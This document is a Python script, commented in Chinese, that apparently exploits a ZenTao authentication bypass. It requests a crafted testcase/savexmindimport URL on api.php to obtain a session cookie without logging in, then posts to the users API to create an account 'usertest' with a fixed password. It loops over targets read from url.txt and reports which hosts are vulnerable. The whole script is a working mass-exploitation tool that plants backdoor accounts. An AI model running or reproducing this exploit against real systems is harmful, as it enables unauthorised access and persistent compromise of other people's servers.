import requests

# 禁用InsecureRequestWarning
requests.packages.urllib3.disable_warnings()

# 获取cookie
def get_cookie(url):
    target = url + '/api.php'
    # 设置请求头
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    # 设置参数
    params = {
        'm': 'testcase',
        'f': 'savexmindimport',
        'HTTP_X_REQUESTED_WITH': 'XMLHttpRequest',
        'productID': 'upkbbehwgfscwizoglpw',
        'branch': 'zqbcsfncxlpopmrvchsu'
    }
    # 发送请求
    response = requests.get(target, headers=headers, params=params, timeout=10, verify=False)
    # 获取Set-Cookie头部
    set_cookie = response.headers.get('Set-Cookie', '')
    # 获取Set-Cookie头部
    # 在Set-Cookie中查找zentaosid的值
    for item in set_cookie.split(';'):
        if 'zentaosid' in item:
            return item

# 添加用户
def add_user(url, cookie):
    target = url + '/api.php/v1/users'
    # 设置请求头
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': cookie,
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # 添加用户名及密码
    data = {
        "account": "usertest",
        "password": "123qwe!@#",
        "realname": "test"
    }
    # 发送POST请求
    response = requests.post(target, headers=headers, data=data, timeout=10, verify=False)

    # 打印响应内容
    if 'usertest' in response.text:
        print('目标：' + url + ' 存在漏洞，已添加用户：usertest, 密码：123qwe!@#')
    else:
        print('目标：' + url + ' 不存在漏洞')

# 从txt文件中读取批量目标
with open('url.txt', 'r') as file:
    urls = file.readlines()
for url in urls:
    url = url.strip()
    zentaosid = get_cookie(url)
    result = add_user(url, zentaosid)
